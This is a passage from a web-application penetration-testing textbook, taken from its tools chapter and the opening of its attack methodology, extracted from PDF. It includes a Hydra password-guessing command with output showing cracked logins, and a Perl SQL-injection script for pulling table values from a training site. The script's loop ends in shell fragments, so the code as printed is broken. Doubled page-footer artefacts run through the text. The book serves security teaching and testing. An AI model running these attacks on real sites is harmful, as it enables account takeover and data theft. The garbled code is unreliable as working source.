the various tools available for yourself, and choose those which best meet your
needs and testing style.
Wikto/Nikto
Nikto is useful for locating default or common third-party content that exists
on a web server. It contains a large database of fi les and directories, including
default pages and scripts that ship with web servers, and third-party items such
as shopping cart software. The tool essentially works by requesting each item
in turn and detecting whether it exists.
The database is updated frequently, meaning that Nikto typically is more
effective than any other automated or manual technique for identifying this
type of content.
Nikto implements a wide range of confi guration options, which can be speci-
fi ed on the command line or via a text-based confi guration fi le. If the application
uses a customized “not found” page, you can avoid false positives by using the
-404 setting, which enables you to specify a string that appears in the custom
error page.
Wikto is a Windows version of Nikto that has some additional features, such
as enhanced detection of custom “not-found” responses and Google-assisted
directory mining.
Firebug
Firebug is a browser debugging tool that lets you debug and edit HTML and
JavaScript in real time on the currently displayed page. You can also explore
and edit the DOM.
Firebug is extremely powerful for analyzing and exploiting a wide range of
client-side attacks, including all kinds of cross-site scripting, request forgery
and UI redress, and cross-domain data capture, as described in Chapter 13.
Hydra
Hydra is a password-guessing tool that can be used in a wide range of situa-
tions, including with the forms-based authentication commonly used in web
cc2200..iinndddd 778855 88//1199//22001111 1122::2211::1111 PPMM
Stuttard c20.indd V3 - 08/16/2011 Page 786
786 Chapter 20 n A Web Application Hacker’s Toolkit
applications. Of course, you can use a tool such as Burp Intruder to execute any
attack of this kind in a completely customized way; however, in many situations
Hydra can be just as useful.
Hydra enables you to specify the target URL, the relevant request parameters,
word lists for attacking the username and password fi elds, and details of the error
message that is returned following an unsuccessful login. The -t setting can be
used to specify the number of parallel threads to use in the attack. For example:
C:\>hydra.exe –t 32 -L user.txt -P password.txt wahh-app.com http-post-form
“/login.asp:login_name=^USER^&login_password=^PASS^&login=Login:Invalid”
Hydra v6.4 (c) 2011 by van Hauser / THC - use allowed only for legal
purposes.
Hydra (http://www.thc.org) starting at 2011-05-22 16:32:48
[DATA] 32 tasks, 1 servers, 21904 login tries (l:148/p:148), ~684 tries per
task
[DATA] attacking service http-post-form on port 80
[STATUS] 397.00 tries/min, 397 tries in 00:01h, 21507 todo in 00:55h
[80][www-form] host: 65.61.137.117 login: alice password: password
[80][www-form] host: 65.61.137.117 login: liz password: password
...
Custom Scripts
In the authors’ experience, the various off-the-shelf tools that exist are suffi cient
to help you perform the vast majority of tasks that you need to carry out when
attacking a web application. However, in various unusual situations you will
need to create your own customized tools and scripts to address a particular
problem. For example:
n The application uses an unusual session-handling mechanism, such as one that
involves per-page tokens that must be resubmitted in the correct sequence.
n You want to exploit a vulnerability that requires several specifi c steps to be
performed repeatedly, with data retrieved on one response incorporated
into subsequent requests.
n The application aggressively terminates your session when it identifi es a
potentially malicious request, and acquiring a fresh authenticated session
requires several nonstandard steps.
n You need to provide a “point and click” exploit to an application owner
to demonstrate the vulnerability and the risk.
If you have some programming experience, the easiest way to address prob-
lems of this kind is to create a small, fully customized program to issue the
relevant requests and process the application’s responses. You can produce this
either as a standalone tool or as an extension to one of the integrated testing
cc2200..iinndddd 778866 88//1199//22001111 1122::2211::1122 PPMM
Stuttard c20.indd V3 - 08/16/2011 Page 787
Chapter 20 n A Web Application Hacker’s Toolkit 787
suites described earlier. For example, you can use the Burp Extender interface
to extend Burp Suite or the BeanShell interface to extend WebScarab.
Scripting languages such as Perl contain libraries to help make HTTP com-
munication straightforward, and you often can carry out customized tasks using
only a few lines of code. Even if you have limited programming experience, you
often can fi nd a script on the Internet that you can tweak to meet your require-
ments. The following example shows a simple Perl script that exploits a SQL
injection vulnerability in a search form to make recursive queries and retrieve
all the values in a specifi ed table column. It starts with the highest value and
iterates downward (see Chapter 9 for more details on this kind of attack):
use HTTP::Request::Common;
use LWP::UserAgent;
$ua = LWP::UserAgent->new();
my $col = @ARGV[1];
my $from_stmt = @ARGV[3];
if ($#ARGV!=3) {
print “usage: perl sql.pl SELECT column FROM table\n”;
exit;
}
while(1)
{
$payload = “foo’ or (1 in (select max($col) from $from_stmt
$test))--”;
my $req = POST “http://mdsec.net/addressbook/32/Default.aspx”,
[__VIEWSTATE => ‘’, Name => $payload, Email => ‘john@test.
com’, Phone =>
‘12345’, Search => ‘Search’, Address => ‘1 High Street’, Age =>
‘30’,];
my $resp = $ua->request($req);
my $content = $resp->as_string;
#print $content;
if ($content =~ /nvarchar value ‘(.*)’/)
{
print “$1\n”; # print the extracted match
}
else
{exit;}
$test = “where $col (.*)” | sed ‘s/.......\(.*\)......../\1/’
done
TRY IT!
http://mdsec.net/app/
Netcat
Netcat is a versatile tool that can be used to perform numerous network-related
tasks. It is a cornerstone of many beginners’ hacking tutorials. You can use it to
open a TCP connection to a server, send a request, and retrieve the response.
In addition to this use, Netcat can be used to create a network listener on your
computer to receive connections from a server you are attacking. See Chapter 9
cc2200..iinndddd 778888 88//1199//22001111 1122::2211::1122 PPMM
Stuttard c20.indd V3 - 08/16/2011 Page 789
Chapter 20 n A Web Application Hacker’s Toolkit 789
for an example of this technique being used to create an out-of-band channel
in a database attack.
Netcat does not itself support SSL connections, but this can be achieved if
you use it in combination with the stunnel tool, described next.
Stunnel
Stunnel is useful when you are working with your own scripts or other tools
that do not themselves support HTTPS connections. Stunnel enables you to
create client SSL connections to any host, or server SSL sockets to listen for
incoming connections from any client. Because HTTPS is simply the HTTP
protocol tunneled over SSL, you can use stunnel to provide HTTPS capabili-
ties to any other tool.
For example, the following command shows stunnel being confi gured to cre-
ate a simple TCP server socket on port 88 of the local loopback interface. When
a connection is received, stunnel performs an SSL negotiation with the server
at wahh-app.com, forwarding the incoming cleartext connection through the
SSL tunnel to this server:
C:\bin>stunnel -c -d localhost:88 -r wahh-app.com:443
2011.01.08 15:33:14 LOG5[1288:924]: Using ‘wahh-app.com.443’ as
tcpwrapper service name
2011.01.08 15:33:14 LOG5[1288:924]: stunnel 3.20 on x86-pc-
mingw32-gnu WIN32
You can now simply point any tool that is not SSL-capable at port 88 on the
loopback interface. This effectively communicates with the destination server
over HTTPS:
2011.01.08 15:33:20 LOG5[1288:1000]: wahh-app.com.443 connected
from 127.0.0.1:1113
2011.01.08 15:33:26 LOG5[1288:1000]: Connection closed: 16 bytes
sent to SSL, 392 bytes sent to socket
Summary
This book has focused on the practical techniques you can use to attack web
applications. Although you can carry out some of these tasks using only a
browser, to perform an effective and comprehensive attack of an application,
you need some tools.
The most important and indispensable tool in your arsenal is the intercepting
proxy, which enables you to view and modify all traffi c passing in both direc-
tions between browser and server. Today’s proxies are supplemented with a
cc2200..iinndddd 778899 88//1199//22001111 1122::2211::1122 PPMM
Stuttard c20.indd V3 - 08/16/2011 Page 790
790 Chapter 20 n A Web Application Hacker’s Toolkit
wealth of other integrated tools that can help automate many of the tasks you
will need to perform. In addition to one of these tool suites, you need to use one
or more browser extensions that enable you to continue working in situations
where a proxy cannot be used.
The other main type of tool you may employ is a standalone web application
scanner. These tools can be effective at quickly discovering a range of common
vulnerabilities, and they can also help you map and analyze an application’s
functionality. However, they are unable to identify many kinds of security
fl aws, and you can’t rely on them to give a completely clean bill of health to
any application.
Ultimately, what will make you an accomplished web application hacker is
your ability to understand how web applications function, where their defenses
break down, and how to probe them for exploitable vulnerabilities. To do this
effectively, you need tools that enable you to look under the hood, to manipu-
late your interaction with applications in a fi ne-grained way, and to leverage
automation wherever possible to make your attacks faster and more reliable.
Whichever tools you fi nd most useful in achieving these objectives are the right
ones for you. And if the available tools don’t meet your needs, you can always
create your own. It isn’t that diffi cult, honest.
cc2200..iinndddd 779900 88//1199//22001111 1122::2211::1122 PPMM
Stuttard c21.indd V3 - 08/16/2011 Page 791
CHAPTER
21
A Web Application Hacker’s
Methodology
This chapter contains a detailed step-by-step methodology you can follow when
attacking a web application. It covers all the categories of vulnerabilities and
attack techniques described in this book. Following all the steps in this meth-
odology will not guarantee that you discover all the vulnerabilities within a
given application. However, it will provide you with a good level of assurance
that you have probed all the necessary regions of the application’s attack surface
and have found as many issues as possible given the resources available to you.
Figure 21-1 illustrates the main areas of work that this methodology describes.
We will drill down into this diagram and illustrate the subdivision of tasks that
each area involves. The numbers in the diagrams correspond to the hierarchical
numbered list used in the methodology, so you can easily jump to the actions
involved in a specifi c area.
The methodology is presented as a sequence of tasks that are organized and
ordered according to the logical interdependencies between them. As far as pos-
sible, these interdependencies are highlighted in the task descriptions. However,
in practice you will frequently need to think imaginatively about the direction
in which your activities should go and allow these to be guided by what you
discover about the application you are attacking. For example:
n Information gathered in one stage may enable you to return to an earlier
stage and formulate more focused attacks. For example, an access control
bug that enables you to obtain a listing of all users may enable you to
791
cc2211..iinndddd 779911 88//1199//22001111 1122::2222::0011 PPMM
Stuttard c21.indd V3 - 08/16/2011 Page 792
792 Chapter 21 n A Web Application Hacker’s Methodology
perform a more effective password-guessing attack against the authen-
tication function.
n Discovering a key vulnerability in one area of the application may enable
you to shortcut some of the work in other areas. For example, a fi le disclosure
vulnerability may enable to you perform a code review of key application
functions rather than probing them in a solely black-box manner.
n The results of your testing in some areas may highlight patterns of recur-
ring vulnerabilities that you can immediately probe for in other areas.
For example, a generic defect in the application’s input validation fi lters
may enable you to quickly fi nd a bypass of its defenses against several
different categories of attack.
Recon and analysis
1. Map application content
2. Analyze the application
Application logic Access handling Input handling Application hosting
3. Test client-side 4. Test 7. Fuzz all 10. Test for shared
controls authentication parameters hosting issues
8. Test for issues
9. Test for logic 5. Test session 11. Test the web
with specific
flaws management server
functionality
6. Test access
controls
12. Miscellaneous 13. Information
Checks Leakage
Figure 21-1: The main areas of work involved in the methodology
Use the steps in this methodology to guide your work, and as a checklist to
avoid oversights, but do not feel obligated to adhere to them too rigidly. Keep
cc2211..iinndddd 779922 88//1199//22001111 1122::2222::0011 PPMM
Stuttard c21.indd V3 - 08/16/2011 Page 793
Chapter 21 n A Web Application Hacker’s Methodology 793
the following thought in mind: the tasks we describe are largely standard and
orthodox; the most impressive attacks against web applications always involve
thinking beyond them.
General Guidelines
You should always keep in mind some general considerations when carrying out
the detailed tasks involved in attacking a web application. These may apply to all
the different areas you need to examine and techniques you need to carry out.
n Remember that several characters have special meaning in different parts
of the HTTP request. When you are modifying the data within requests,
you should URL-encode these characters to ensure that they are interpreted
in the way you intend:
n & is used to separate parameters in the URL query string and message
body. To insert a literal & character, you should encode this as %26.
n = is used to separate the name and value of each parameter in the URL
query string and message body. To insert a literal = character, you
should encode this as %3d.
n ? is used to mark the beginning of the URL query string. To insert a
literal? character, you should encode this as %3f.
n A space is used to mark the end of the URL in the fi rst line of requests
and can indicate the end of a cookie value in the Cookie header. To
insert a literal space, you should encode this as %20 or +.
n Because+ represents an encoded space, to insert a literal + character,
you should encode this as %2b.
n ; is used to separate individual cookies in the Cookie header. To insert
a literal ; character, you should encode this as %3b.
n # is used to mark the fragment identifi er within the URL. If you enter
this character into the URL within your browser, it effectively truncates
the URL that is sent to the server. To insert a literal # character, you